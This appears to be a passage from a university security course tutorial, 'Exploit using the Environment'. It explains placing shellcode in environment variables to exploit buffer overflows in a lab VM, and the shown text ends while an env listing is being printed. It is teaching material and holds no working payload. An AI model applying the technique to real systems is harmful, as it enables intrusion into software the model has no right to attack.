
<!DOCTYPE html>

<html xmlns="http://www.w3.org/1999/xhtml">
  <head>
    <meta http-equiv="X-UA-Compatible" content="IE=Edge" />
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
    <title>Tutorial: Exploit using the Environment &#8212; Exercises 2022 documentation</title>
    <link rel="stylesheet" href="../_static/bootstrap-sphinx.css" type="text/css" />
    <link rel="stylesheet" href="../_static/pygments.css" type="text/css" />
    <link rel="stylesheet" href="../_static/css/my-style.css" type="text/css" />
    <script type="text/javascript" id="documentation_options" data-url_root="../" src="../_static/documentation_options.js"></script>
    <script type="text/javascript" src="../_static/jquery.js"></script>
    <script type="text/javascript" src="../_static/underscore.js"></script>
    <script type="text/javascript" src="../_static/doctools.js"></script>
    <script type="text/javascript" src="../_static/language_data.js"></script>
    <link rel="shortcut icon" href="../_static/favicon.ico"/>
    <link rel="index" title="Index" href="../genindex.html" />
    <link rel="search" title="Search" href="../search.html" />
    <link rel="prev" title="Tutorial: Heap overflow exploit - Abusing the file system" href="heapoverflow2.html" />

<meta charset='utf-8'>
<meta http-equiv='X-UA-Compatible' content='IE=edge,chrome=1'>
<meta name='viewport' content='width=device-width, initial-scale=1.0, maximum-scale=1'>
<meta name="apple-mobile-web-app-capable" content="yes">
<script type="text/javascript" src="../_static/js/jquery-1.12.4.min.js "></script>
<script type="text/javascript" src="../_static/js/jquery-fix.js "></script>
<script type="text/javascript" src="../_static/bootstrap-3.4.1/js/bootstrap.min.js "></script>
<script type="text/javascript" src="../_static/bootstrap-sphinx.js "></script>

<link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.11.0/umd/popper.min.js"></script>
<script type="text/javascript" src="../_static/js/jquery-1.11.0.min.js "></script>
<script type="text/javascript" src="../_static/js/jquery-fix.js "></script>
<script type="text/javascript" src="../_static/script.js"></script>





  </head><body>

  <div id="navbar" class="navbar navbar-inverse navbar-default navbar-fixed-top">
    <div class="container">
      <div class="navbar-header">
        <!-- .btn-navbar is used as the toggle for collapsed navbar content -->
        <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".nav-collapse">
          <span class="icon-bar"></span>
          <span class="icon-bar"></span>
          <span class="icon-bar"></span>
        </button>
        <a class="navbar-brand" href="../index.html"><span><img src="../_static/UCLouvain_Logo+moodle.png"></span>
          LINGI2144</a>
        <span class="navbar-text navbar-version pull-left"><b>2022</b></span>
      </div>

        <div class="collapse navbar-collapse nav-collapse">
          <ul class="nav navbar-nav">
            
                <li><a href="/index.html">Main</a></li>
                <li><a href="/theory/index.html">Theory</a></li>
                <li><a href="/qcm/index.html">MCQ</a></li>
            
            
              <li class="dropdown globaltoc-container">
  <a role="button"
     id="dLabelGlobalToc"
     data-toggle="dropdown"
     data-target="#"
     href="../index.html">Section <b class="caret"></b></a>
  <ul class="dropdown-menu globaltoc"
      role="menu"
      aria-labelledby="dLabelGlobalToc"><ul>
<li class="toctree-l1"><a class="reference internal" href="../tp0/tp.html">Tutorial 0: Initiation</a><ul>
<li class="toctree-l2"><a class="reference internal" href="../tp0/tp.html#exercise">Exercise</a></li>
<li class="toctree-l2"><a class="reference internal" href="../tp0/tp.html#bonus-going-beyond">Bonus: going beyond</a></li>
</ul>
</li>
<li class="toctree-l1"><a class="reference internal" href="../tp1/tp.html">Tutorial 1: Race conditions</a><ul>
<li class="toctree-l2"><a class="reference internal" href="../tp1/tp.html#prerequisite">Prerequisite</a></li>
<li class="toctree-l2"><a class="reference internal" href="../tp1/tp.html#exercise">Exercise</a></li>
<li class="toctree-l2"><a class="reference internal" href="../tp1/tp.html#nfs-share-exploit-metasploit">NFS Share exploit - Metasploit</a></li>
</ul>
</li>
<li class="toctree-l1"><a class="reference internal" href="../tp2/tp.html">Tutorial 2: Memory Safety</a></li>
<li class="toctree-l1"><a class="reference internal" href="../tp3/tp.html">Tutorial 3: Debugging with <code class="docutils literal notranslate"><span class="pre">GDB</span></code></a></li>
<li class="toctree-l1"><a class="reference internal" href="../tp4/tp.html">Tutorial 4: Buffer Overflow</a></li>
<li class="toctree-l1"><a class="reference internal" href="../tp5/tp.html">Tutorial 5: Buffer Overflows and Shellcodes</a></li>
<li class="toctree-l1"><a class="reference internal" href="../tp6/tp.html">Tutorial 6: Protection</a></li>
<li class="toctree-l1"><a class="reference internal" href="../tp7/tp.html">Tutorial 7: Format String</a></li>
<li class="toctree-l1"><a class="reference internal" href="../tp8/tp.html">Tutorial 8: YARA</a></li>
<li class="toctree-l1"><a class="reference internal" href="../tp9/tp.html">Tutorial 9: Dynamic Analysis</a></li>
</ul>
<ul class="current">
<li class="toctree-l1"><a class="reference internal" href="extra.html">Setting up the lab environment</a><ul>
<li class="toctree-l2"><a class="reference internal" href="extra.html#download-a-vm-manager">Download a VM manager</a></li>
<li class="toctree-l2"><a class="reference internal" href="extra.html#grab-your-kali-linux-image">Grab your Kali Linux Image</a></li>
<li class="toctree-l2"><a class="reference internal" href="extra.html#bonus-make-yourself-at-home">Bonus : Make yourself at home !</a></li>
</ul>
</li>
<li class="toctree-l1"><a class="reference internal" href="gdb.html">Tutorial: Complement on GDB</a><ul>
<li class="toctree-l2"><a class="reference internal" href="gdb.html#introduction">Introduction</a></li>
<li class="toctree-l2"><a class="reference internal" href="gdb.html#exercise">Exercise</a></li>
</ul>
</li>
<li class="toctree-l1"><a class="reference internal" href="handmadeshellcode.html">Tutorial:  Handmade Shellcode</a><ul>
<li class="toctree-l2"><a class="reference internal" href="handmadeshellcode.html#introduction">Introduction</a></li>
<li class="toctree-l2"><a class="reference internal" href="handmadeshellcode.html#from-c-to-shellcode">From C to shellcode</a></li>
<li class="toctree-l2"><a class="reference internal" href="handmadeshellcode.html#removing-null-bytes">Removing Null bytes</a></li>
</ul>
</li>
<li class="toctree-l1"><a class="reference internal" href="stackstethoscope.html">Tutorial:  ByPassing ASLR - Stack Stethoscope</a><ul>
<li class="toctree-l2"><a class="reference internal" href="stackstethoscope.html#introduction">Introduction</a></li>
<li class="toctree-l2"><a class="reference internal" href="stackstethoscope.html#exercise">Exercise</a></li>
</ul>
</li>
<li class="toctree-l1"><a class="reference internal" href="nfsshare2.html">Tutorial:  NFS Share exploit - Shellcode</a><ul>
<li class="toctree-l2"><a class="reference internal" href="nfsshare2.html#prerequisite">Prerequisite</a></li>
<li class="toctree-l2"><a class="reference internal" href="nfsshare2.html#exercise">Exercise</a></li>
</ul>
</li>
<li class="toctree-l1"><a class="reference internal" href="heapoverflow.html">Tutorial:  Heap overflow exploit - Function pointers</a><ul>
<li class="toctree-l2"><a class="reference internal" href="heapoverflow.html#introduction">Introduction</a></li>
<li class="toctree-l2"><a class="reference internal" href="heapoverflow.html#exercise">Exercise</a></li>
</ul>
</li>
<li class="toctree-l1"><a class="reference internal" href="heapoverflow2.html">Tutorial:  Heap overflow exploit - Abusing the file system</a><ul>
<li class="toctree-l2"><a class="reference internal" href="heapoverflow2.html#introduction">Introduction</a></li>
<li class="toctree-l2"><a class="reference internal" href="heapoverflow2.html#exercise">Exercise</a></li>
<li class="toctree-l2"><a class="reference internal" href="heapoverflow2.html#gaining-root-access">Gaining root access</a></li>
<li class="toctree-l2"><a class="reference internal" href="heapoverflow2.html#bonus">BONUS</a></li>
</ul>
</li>
<li class="toctree-l1 current"><a class="current reference internal" href="#">Tutorial: Exploit using the Environment</a><ul>
<li class="toctree-l2"><a class="reference internal" href="#requirements">Requirements</a></li>
<li class="toctree-l2"><a class="reference internal" href="#adding-environment-variable">Adding environment variable</a></li>
<li class="toctree-l2"><a class="reference internal" href="#go-even-further">Go even further</a></li>
</ul>
</li>
</ul>
</ul>
</li>
              
            
            
            
            
            
          </ul>

          
            
<form class="navbar-form navbar-right" action="../search.html" method="get">
 <div class="form-group">
  <input type="text" name="q" class="form-control" placeholder="Search" />
 </div>
  <input type="hidden" name="check_keywords" value="yes" />
  <input type="hidden" name="area" value="default" />
</form>
          
        </div>
    </div>
  </div>

<div class="container" >
  <div class="row">
      <div class="col-md-3">
        <div id="sidebar" class="bs-sidenav" role="complementary">
<form action="../search.html" method="get">
 <div class="form-group">
  <input type="text" name="q" class="form-control" placeholder="Search" />
 </div>
  <input type="hidden" name="check_keywords" value="yes" />
  <input type="hidden" name="area" value="default" />
</form><ul>
<li><a class="reference internal" href="#">Tutorial: Exploit using the Environment</a><ul>
<li><a class="reference internal" href="#requirements">Requirements</a></li>
<li><a class="reference internal" href="#adding-environment-variable">Adding environment variable</a></li>
<li><a class="reference internal" href="#go-even-further">Go even further</a><ul>
<li><a class="reference internal" href="#sledless">Sledless</a></li>
</ul>
</li>
</ul>
</li>
</ul>
<div class="row autorization" style="padding-top: 20px">
    <div class="col-xs-4 col-md-6">
        <form id="pdf_tp" target="_blank" style="text-align:center;" method="get" action="">
            <button style="text-align:center; border-radius:12px;" type="submit" class="up">
                <svg id="Capa_1"
                     width="50px" height="50px"
                     enable-background="new 0 0 512 512" height="512" viewBox="0 0 512 512" width="512" xmlns="http://www.w3.org/2000/svg"><g><g><path d="m393.5 151.547v263.953c0 22.091-17.909 40-40 40h-275c-22.091 0-40-17.909-40-40v-368c0-22.091 17.909-40 40-40h171.197c7.968 0 15.608 3.17 21.236 8.809l113.803 114.047c5.612 5.625 8.764 13.246 8.764 21.191z" fill="#f9f8f9"/><path d="m393.5 151.55v17.59h-104.32c-31.45 0-57.04-25.62-57.04-57.1v-104.54h17.56c7.96 0 15.6 3.17 21.23 8.81l113.81 114.05c5.61 5.62 8.76 13.24 8.76 21.19z" fill="#e3e0e4"/><path d="m108.5 455.5h-30c-22.09 0-40-17.91-40-40v-368c0-22.09 17.91-40 40-40h30c-22.09 0-40 17.91-40 40v368c0 22.09 17.91 40 40 40z" fill="#e3e0e4"/><g fill="#a29aa5"><path d="m219.608 157.5h-123.7c-4.142 0-7.5-3.358-7.5-7.5s3.358-7.5 7.5-7.5h123.7c4.142 0 7.5 3.358 7.5 7.5s-3.358 7.5-7.5 7.5z"/><path d="m219.608 337.5h-123.7c-4.142 0-7.5-3.358-7.5-7.5s3.358-7.5 7.5-7.5h123.7c4.142 0 7.5 3.358 7.5 7.5s-3.358 7.5-7.5 7.5z"/><path d="m317.908 217.5h-224c-4.142 0-7.5-3.358-7.5-7.5s3.358-7.5 7.5-7.5h224c4.142 0 7.5 3.358 7.5 7.5s-3.358 7.5-7.5 7.5z"/><path d="m317.908 277.5h-224c-4.142 0-7.5-3.358-7.5-7.5s3.358-7.5 7.5-7.5h224c4.142 0 7.5 3.358 7.5 7.5s-3.358 7.5-7.5 7.5z"/><path d="m390.81 139.14h-101.63c-14.93 0-27.04-12.14-27.04-27.1v-101.82c3.24 1.46 6.23 3.52 8.79 6.09l113.81 114.05c2.55 2.56 4.61 5.54 6.07 8.78z"/></g><ellipse cx="371.989" cy="403" fill="#80e29e" rx="101.511" ry="101.5"/><path d="m453.07 464.07c-18.52 24.56-47.95 40.43-81.08 40.43-56.06 0-101.51-45.44-101.51-101.5 0-33.13 15.87-62.55 40.43-81.07-12.83 16.99-20.43 38.14-20.43 61.07 0 56.06 45.45 101.5 101.51 101.5 22.93 0 44.08-7.6 61.08-20.43z" fill="#77d192"/><path d="m423.124 410.243c-4.008-7.25-13.135-9.881-20.386-5.873l-15.747 8.701v-45.572c0-8.284-6.717-15-15.002-15s-15.002 6.716-15.002 15v45.573l-15.747-8.701c-7.252-4.007-16.378-1.377-20.386 5.873-4.007 7.251-1.377 16.377 5.875 20.384l38.004 21c.091.05.184.093.275.141.139.073.278.146.419.214.167.082.336.158.505.232.125.055.25.111.377.163.198.081.398.156.598.228.099.036.197.073.297.107.24.081.481.153.723.222.064.018.127.038.191.055.287.077.576.144.865.204.023.005.046.011.069.015.971.194 1.95.294 2.924.294l-.001-.003h.015c2.497 0 4.997-.623 7.256-1.872l38.004-21c7.251-4.008 9.881-13.134 5.874-20.385z" fill="#f9f8f9"/></g><g><path d="m38.5 129.5c4.143 0 7.5-3.358 7.5-7.5v-74.5c0-17.92 14.581-32.5 32.504-32.5h171.215c1.687 0 3.339.203 4.946.562v96.474c0 19.08 15.497 34.603 34.546 34.603h96.274c.354 1.595.553 3.235.553 4.908v40.453c0 4.142 3.357 7.5 7.5 7.5s7.5-3.358 7.5-7.5v-40.453c0-10.002-3.892-19.409-10.957-26.488l-113.815-114.047c-7.087-7.101-16.515-11.012-26.547-11.012h-171.215c-26.193 0-47.504 21.309-47.504 47.5v74.5c0 4.142 3.357 7.5 7.5 7.5zm336.956 2.139h-86.245c-10.777 0-19.546-8.793-19.546-19.603v-86.404z"/><path d="m171 448h-92.496c-17.923 0-32.504-14.58-32.504-32.5v-258.5c0-4.142-3.357-7.5-7.5-7.5s-7.5 3.358-7.5 7.5v258.5c0 26.191 21.311 47.5 47.504 47.5h92.496c4.143 0 7.5-3.358 7.5-7.5s-3.357-7.5-7.5-7.5z"/><path d="m95.914 157.5h123.713c4.143 0 7.5-3.358 7.5-7.5s-3.357-7.5-7.5-7.5h-123.713c-4.143 0-7.5 3.358-7.5 7.5s3.357 7.5 7.5 7.5z"/><path d="m95.914 322.5c-4.143 0-7.5 3.358-7.5 7.5s3.357 7.5 7.5 7.5h123.713c4.143 0 7.5-3.358 7.5-7.5s-3.357-7.5-7.5-7.5z"/><path d="m317.938 202.5h-224.025c-4.143 0-7.5 3.358-7.5 7.5s3.357 7.5 7.5 7.5h224.024c4.143 0 7.5-3.358 7.5-7.5s-3.357-7.5-7.499-7.5z"/><path d="m325.438 270c0-4.142-3.357-7.5-7.5-7.5h-224.025c-4.143 0-7.5 3.358-7.5 7.5s3.357 7.5 7.5 7.5h224.024c4.143 0 7.501-3.358 7.501-7.5z"/><path d="m401.038 297.936v-70.936c0-4.142-3.357-7.5-7.5-7.5s-7.5 3.358-7.5 7.5v67.903c-4.6-.594-9.289-.903-14.049-.903-34.387 0-66.05 15.725-86.87 43.142-2.506 3.299-1.862 8.003 1.437 10.509 3.301 2.506 8.005 1.861 10.509-1.438 17.959-23.649 45.268-37.213 74.924-37.213 6.868 0 13.564.747 20.017 2.152.011.002.021.005.032.007 42.237 9.211 73.962 46.888 73.962 91.841 0 51.832-42.173 94-94.011 94s-94.011-42.168-94.011-94c0-9.542 1.423-18.95 4.229-27.965 1.231-3.955-.978-8.159-4.933-9.39-3.956-1.23-8.159.978-9.39 4.932-3.256 10.459-4.906 21.368-4.906 32.423 0 16.037 3.484 31.275 9.731 45h-66.709c-4.143 0-7.5 3.358-7.5 7.5s3.357 7.5 7.5 7.5h75.028c19.528 29.501 53.008 49 90.961 49 60.109 0 109.011-48.897 109.011-109 0-50.048-33.911-92.319-79.962-105.064z"/><path d="m371.989 344.999c-12.407 0-22.502 10.093-22.502 22.5v32.859l-4.619-2.552c-10.857-6.001-24.574-2.048-30.578 8.81-2.907 5.26-3.591 11.338-1.927 17.113s5.479 10.556 10.739 13.463l38.003 21c6.646 3.71 15.127 3.734 21.767 0l38.004-21c5.261-2.907 9.075-7.688 10.739-13.463s.98-11.853-1.928-17.115c-6.003-10.857-19.721-14.81-30.577-8.808l-4.619 2.552v-32.859c0-12.407-10.095-22.5-22.502-22.5zm34.376 65.935c3.617-1.999 8.192-.682 10.194 2.937 2.023 3.489.632 8.315-2.938 10.192l-38.006 21.001c-2.328 1.295-5.291 1.189-7.563-.171l-37.696-20.83c-3.569-1.876-4.96-6.703-2.938-10.19 2.003-3.621 6.577-4.938 10.195-2.938l15.746 8.701c4.749 2.823 11.296-1.04 11.128-6.564v-45.573c0-4.136 3.365-7.5 7.502-7.5s7.502 3.364 7.502 7.5v45.572c-.17 5.534 6.367 9.39 11.127 6.564z"/></g></g>
                </svg>
                <br> <b> PDF </b>
            </button>
        </form>
    </div>
    <div class="col-xs-4 col-md-6">
        <form id="rar_tp"  target="_blank" style="text-align:center;" method="get" action="">
            <button style="text-align:center; border-radius:12px;" type="submit" class="up">
                <svg id="Capa_1"
                     width="50px" height="50px"
                     enable-background="new 0 0 512 512" height="512" viewBox="0 0 512 512" width="512" xmlns="http://www.w3.org/2000/svg"><g><g><path d="m453.31 460.125c0 24.508-19.907 44.375-44.464 44.375h-305.692c-24.557 0-44.464-19.867-44.464-44.375v-408.25c0-24.508 19.907-44.375 44.464-44.375h190.303c8.857 0 17.35 3.516 23.606 9.773l126.505 126.521c6.239 6.239 9.742 14.694 9.742 23.508z" fill="#f9f8f9"/><path d="m133.15 504.5h-30c-24.55 0-44.46-19.87-44.46-44.38v-408.24c0-24.51 19.91-44.38 44.46-44.38h30c-24.55 0-44.46 19.87-44.46 44.38v408.24c0 24.51 19.91 44.38 44.46 44.38z" fill="#e3e0e4"/><path d="m453.31 167.3v16.24h-115.96c-33.12 0-60.06-26.95-60.06-60.07v-115.97h16.17c8.85 0 17.35 3.52 23.6 9.77l126.51 126.52c6.24 6.24 9.74 14.7 9.74 23.51z" fill="#e3e0e4"/><path d="m450.32 153.54h-112.97c-16.6 0-30.06-13.46-30.06-30.07v-112.96c3.61 1.63 6.92 3.91 9.77 6.76l126.51 126.52c2.85 2.85 5.12 6.15 6.75 9.75z" fill="#b9a1d3"/><path d="m435 438.5h-358c-22.091 0-40-17.909-40-40v-146c0-22.091 17.909-40 40-40h358c22.091 0 40 17.909 40 40v146c0 22.091-17.909 40-40 40z" fill="#b9a1d3"/><path d="m102 438.5h-25c-22.09 0-40-17.91-40-40v-146c0-22.09 17.91-40 40-40h25c-22.09 0-40 17.91-40 40v146c0 22.09 17.91 40 40 40z" fill="#9573bb"/></g><g><path d="m58.689 153.851c4.143 0 7.5-3.357 7.5-7.5v-94.476c0-20.333 16.582-36.875 36.965-36.875h111.42c4.143 0 7.5-3.357 7.5-7.5s-3.357-7.5-7.5-7.5h-111.42c-28.653 0-51.965 23.271-51.965 51.875v94.476c0 4.142 3.358 7.5 7.5 7.5z"/><path d="m460.811 212.656v-45.354c0-10.879-4.24-21.111-11.938-28.811l-126.506-126.52c-7.718-7.72-17.985-11.971-28.91-11.971h-43.394c-4.143 0-7.5 3.357-7.5 7.5s3.357 7.5 7.5 7.5h43.394c2.165 0 4.288.264 6.334.775v107.696c0 20.714 16.85 37.566 37.561 37.566h107.694c.505 2.025.765 4.125.765 6.265v38.954c-3.476-.812-7.092-1.256-10.811-1.256h-23.319c-4.143 0-7.5 3.357-7.5 7.5s3.357 7.5 7.5 7.5h23.319c17.921 0 32.5 14.579 32.5 32.5v146c0 17.921-14.579 32.5-32.5 32.5h-268.66c-4.143 0-7.5 3.357-7.5 7.5s3.357 7.5 7.5 7.5h268.66c3.719 0 7.335-.444 10.811-1.256v15.381c0 20.333-16.582 36.875-36.965 36.875h-305.692c-20.383 0-36.965-16.542-36.965-36.875v-15.381c3.476.812 7.092 1.256 10.811 1.256h53.319c4.143 0 7.5-3.357 7.5-7.5s-3.357-7.5-7.5-7.5h-53.319c-17.921 0-32.5-14.579-32.5-32.5v-146c0-17.921 14.579-32.5 32.5-32.5h299.702c4.143 0 7.5-3.357 7.5-7.5s-3.357-7.5-7.5-7.5h-299.702c-3.719 0-7.335.444-10.811 1.256v-24.905c0-4.143-3.357-7.5-7.5-7.5s-7.5 3.357-7.5 7.5v31.305c-13.04 8.477-21.689 23.165-21.689 39.844v146c0 16.679 8.649 31.367 21.689 39.844v21.781c0 28.604 23.312 51.875 51.965 51.875h305.691c28.653 0 51.965-23.271 51.965-51.875v-21.781c13.041-8.477 21.689-23.165 21.689-39.844v-146c.001-16.679-8.648-31.367-21.688-39.844zm-146.02-89.185v-97.863l120.414 120.429h-97.854c-12.439 0-22.56-10.123-22.56-22.566z"/><path d="m265.669 264.091c-1.584-3.853-5.297-6.341-9.462-6.341-.003 0-.006 0-.009 0-4.168.004-7.882 2.499-9.461 6.356-.023.057-.046.114-.067.172l-45.247 118.803c-1.475 3.87.469 8.203 4.34 9.678 3.865 1.475 8.203-.468 9.678-4.34l9.429-24.757h62.347l9.335 24.736c1.458 3.914 5.891 5.823 9.665 4.368 3.875-1.462 5.831-5.789 4.368-9.665l-44.836-118.808c-.025-.067-.053-.135-.08-.202zm-35.087 84.571 25.603-67.226 25.37 67.226z"/><path d="m181.648 296.566c0-21.403-18.208-38.816-40.589-38.816h-32.021c-.007 0-.013.001-.02.001-.006 0-.013-.001-.019-.001-4.143 0-7.5 3.357-7.5 7.5v120.5c0 4.143 3.357 7.5 7.5 7.5s7.5-3.357 7.5-7.5v-50.27c1.064-.006 2.204-.012 3.398-.018l48.62 55.243c2.745 3.118 7.488 3.403 10.585.675 3.109-2.736 3.411-7.476.675-10.585l-39.967-45.411c.438 0 .862-.001 1.249-.001 22.381 0 40.589-17.413 40.589-38.817zm-40.588-23.816c13.87 0 25.589 10.906 25.589 23.816s-11.719 23.816-25.589 23.816c-5.593 0-16.825.056-24.342.096-.042-7.433-.099-18.474-.099-23.912 0-4.577-.032-16.093-.057-23.816z"/><path d="m410.5 296.566c0-21.403-18.208-38.816-40.589-38.816h-32.021c-.007 0-.013.001-.02.001-.006 0-.013-.001-.019-.001-4.143 0-7.5 3.357-7.5 7.5v120.5c0 4.143 3.357 7.5 7.5 7.5s7.5-3.357 7.5-7.5v-50.27c1.064-.006 2.204-.012 3.398-.018l48.62 55.243c2.745 3.118 7.488 3.403 10.585.675 3.109-2.736 3.411-7.476.675-10.585l-39.967-45.411c.438 0 .862-.001 1.249-.001 22.381 0 40.589-17.413 40.589-38.817zm-40.589-23.816c13.87 0 25.589 10.906 25.589 23.816s-11.719 23.816-25.589 23.816c-5.593 0-16.825.056-24.342.096-.042-7.433-.099-18.474-.099-23.912 0-4.577-.032-16.093-.057-23.816z"/></g></g>
                </svg>
                <br> <b> Files </b>
            </button>
        </form>
    </div>
    <div class="col-xs-4 col-md-12">
        <form id="vid_tp" style="text-align:center;">
	<a id="notUp"  href="#!" style="text-align:center;"
   data-title="Watch now on youtube">
            <button class="video-btn up" onclick="topFunction()"
                    style="text-align:center; border-radius:12px;" data-toggle="modal" type="button"
                    data-target="#myModal"
                    data-src="">
                <?xml version="1.0" encoding="iso-8859-1"?>
<!-- Generator: Adobe Illustrator 19.0.0, SVG Export Plug-In . SVG Version: 6.00 Build 0)  -->
<svg width="50px" height="50px" version="1.1" id="Capa_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px"
	 viewBox="0 0 512.003 512.003" style="enable-background:new 0 0 512.003 512.003;" xml:space="preserve">
<path style="fill:#E53935;" d="M443.734,80.336L330.86,70.437c-49.812-4.334-99.906-4.334-149.717,0L68.268,80.336
	c-38.702,3.124-68.459,35.541-68.267,74.368v202.667c-0.204,38.835,29.557,71.265,68.267,74.389l112.939,9.813
	c24.832,2.133,49.835,3.243,74.859,3.243c25.024,0,50.027-1.067,74.859-3.243l112.939-9.813c38.659-3.187,68.348-35.6,68.139-74.389
	V154.704C512.194,115.877,482.436,83.459,443.734,80.336z"/>
<path style="fill:#FAFAFA;" d="M357.782,247.077l-149.333-96c-4.951-3.193-11.552-1.768-14.745,3.183
	c-1.111,1.722-1.702,3.728-1.703,5.777v192c0.002,5.891,4.78,10.665,10.671,10.663c2.049-0.001,4.055-0.592,5.777-1.703l149.333-96
	c4.954-3.187,6.387-9.787,3.2-14.742c-0.825-1.283-1.917-2.374-3.2-3.2V247.077z"/>
<path d="M256.001,444.816c-25.003,0-50.005-1.088-74.837-3.243l-112.896-9.835c-38.71-3.124-68.471-35.554-68.267-74.389V154.683
	c-0.182-38.819,29.573-71.224,68.267-74.347l112.896-9.899c49.797-4.334,99.877-4.334,149.675,0l112.96,9.813
	c38.717,3.158,68.454,35.629,68.203,74.475v202.667c0.204,38.835-29.557,71.265-68.267,74.389l0,0l-112.96,9.813
	C306.028,443.771,281.004,444.816,256.001,444.816z M256.001,88.549c-24.405,0-48.768,1.067-72.981,3.157L69.953,101.52
	c-27.614,2.317-48.794,25.495-48.619,53.205v202.667c-0.116,27.7,21.097,50.827,48.704,53.099l112.96,9.813
	c48.57,4.209,97.414,4.209,145.984,0l113.067-9.813c27.589-2.315,48.76-25.456,48.619-53.141V154.683
	c0.116-27.7-21.097-50.827-48.704-53.099l-112.96-9.813c-24.235-2.105-48.569-3.164-73.003-3.179V88.549z"/>
<path d="M202.668,362.704c-5.891,0-10.667-4.776-10.667-10.667v-192c-0.01-5.891,4.758-10.674,10.649-10.684
	c2.057-0.003,4.07,0.588,5.799,1.703l149.333,96c4.96,3.178,6.405,9.776,3.227,14.736c-0.83,1.296-1.931,2.397-3.227,3.227
	l-149.333,96C206.724,362.124,204.717,362.709,202.668,362.704z M213.334,179.579v152.917l118.933-76.459L213.334,179.579z"/>
<g>
</g>
<g>
</g>
<g>
</g>
<g>
</g>
<g>
</g>
<g>
</g>
<g>
</g>
<g>
</g>
<g>
</g>
<g>
</g>
<g>
</g>
<g>
</g>
<g>
</g>
<g>
</g>
<g>
</g>
</svg>

                <br> <b>  Video </b>
            </button>
        </a>
</form>

  <!-- Modal -->
  <!-- Modal -->
  <div class="modal fade" id="myModal" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel"
    aria-hidden="true">
    <div class="modal-dialog" role="document">
      <div class="modal-content">

        <div class="modal-body">

          <button type="button" class="close" data-dismiss="modal" aria-label="Close">
            <span aria-hidden="true">&times;</span>
          </button>
          <!-- 16:9 aspect ratio -->
          <div id="video-view" class="embed-responsive embed-responsive-16by9">

          </div>
        </div>
      </div>
    </div>
  </div>
    </div>
</div>
        </div>
      </div>
    <div class="body col-md-9 content" role="main" >
      
  <div class="section" id="tutorial-exploit-using-the-environment">
<h1>Tutorial: Exploit using the Environment<a class="headerlink" href="#tutorial-exploit-using-the-environment" title="Permalink to this headline">¶</a></h1>
<div class="section" id="requirements">
<h2>Requirements<a class="headerlink" href="#requirements" title="Permalink to this headline">¶</a></h2>
<p>Download the Kali VM from this link (Same than NFS - Metasploitable)</p>
<p class="centered">
<strong><a class="reference external" href="https://transvol.sgsi.ucl.ac.be/download.php?id=cdb293424a0498c7">https://transvol.sgsi.ucl.ac.be/download.php?id=cdb293424a0498c7</a></strong></p><div class="line-block">
<div class="line">Working directory: <code class="docutils literal notranslate"><span class="pre">~/SecurityClass/Tutorial-Extra</span></code></div>
<div class="line">Connection:</div>
</div>
<table border="1" class="docutils">
<colgroup>
<col width="50%" />
<col width="50%" />
</colgroup>
<thead valign="bottom">
<tr class="row-odd"><th class="head"><strong>username</strong></th>
<th class="head"><strong>password</strong></th>
</tr>
</thead>
<tbody valign="top">
<tr class="row-even"><td>admin</td>
<td>nimda</td>
</tr>
</tbody>
</table>
<hr class="docutils" />
<p>In the previous tutorials, we have seen how to exploit a buffer-overflow
vulnerability by injecting shellcode directly into the buffer and
overwriting the stack.</p>
<p>Sometimes we won’t have the luxury to have a buffer long enough for our
shellcodes. Indeed some shellcodes are more complex and can be up to 100
bytes long without the NOP sled and the return address.</p>
<p>To solve this issue we can stash our shellcode somewhere else in memory.</p>
<p>While executing a program, the environment variables will be pushed on
the stack so they can be accessed while the program is running. It seems
like a perfect place to put some shellcode if we can find where in
memory it sits.</p>
</div>
<div class="section" id="adding-environment-variable">
<h2>Adding environment variable<a class="headerlink" href="#adding-environment-variable" title="Permalink to this headline">¶</a></h2>
<p>The first step is to create an env variable that contains our shellcode.
We will first try with some dummy text, eg ‘test’, and see if we can see
where it sits in memory.</p>
<p>This can be easily done with the <code class="docutils literal notranslate"><span class="pre">export</span></code> command :</p>
<div class="code console highlight-default notranslate"><div class="highlight"><pre><span></span>$ export MYVAR=hacked
$ echo $MYVAR
hacked
</pre></div>
</div>
<p>We can list the environment variables with the <code class="docutils literal notranslate"><span class="pre">env</span></code> command :</p>
<div class="code console highlight-default notranslate"><div class="highlight"><pre><span></span>$ env
SHELL=/bin/bash
MYVAR=hacked
PWD=/home/kali/Documents/Security/LINGI2144-2020-2022/env-variable
LOGNAME=kali
XDG_SESSION_TYPE=tty
HOME=/home/kali
LANG=en_US.UTF-8
LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.w